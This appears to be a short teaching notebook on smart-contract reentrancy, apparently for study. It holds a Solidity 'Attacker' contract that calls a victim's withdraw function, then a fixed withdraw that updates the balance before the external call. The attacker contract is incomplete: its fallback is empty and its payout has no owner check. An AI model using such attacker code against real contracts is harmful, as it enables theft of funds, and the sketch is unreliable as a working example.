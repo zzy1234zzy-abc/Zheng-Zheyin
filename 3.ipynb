{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c310173b",
   "metadata": {},
   "outputs": [],
   "source": [
    "pragma solidity ^0.4.24;\n",
    "\n",
    "contract Attacker {\n",
    "    address public victim;\n",
    "    uint public amount;\n",
    "\n",
    "    function attack(address _victim) public payable {\n",
    "        victim = _victim;\n",
    "        amount = msg.value;\n",
    "        victim.call.value(amount)(abi.encodeWithSignature(\"withdraw(uint256)\", amount));\n",
    "    }\n",
    "\n",
    "    function withdraw() public {\n",
    "        if (address(this).balance > 0) {\n",
    "            msg.sender.transfer(address(this).balance);\n",
    "        }\n",
    "    }\n",
    "\n",
    "    function () public payable {}\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "14f72f8e",
   "metadata": {},
   "outputs": [],
   "source": [
    "function withdraw(uint amount) public {\n",
    "    require(deposits[msg.sender] >= amount);\n",
    "    deposits[msg.sender] -= amount; // Effect first\n",
    "    msg.sender.call.value(amount)(); // Then interaction\n",
    "}"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
